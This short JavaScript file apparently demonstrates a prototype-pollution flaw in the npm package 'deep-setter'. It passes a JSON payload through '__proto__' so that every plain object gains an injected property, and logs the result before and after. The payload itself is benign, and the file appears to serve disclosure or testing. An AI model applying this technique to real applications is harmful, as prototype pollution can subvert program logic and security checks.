const deep = require('deep-setter');

var malicious_payload = '{"oops": "It works!"}';
a = {};
console.log('Before: ' + a.oops);
deep(a, '__proto__', JSON.parse(malicious_payload));
console.log('After: ' + a.oops);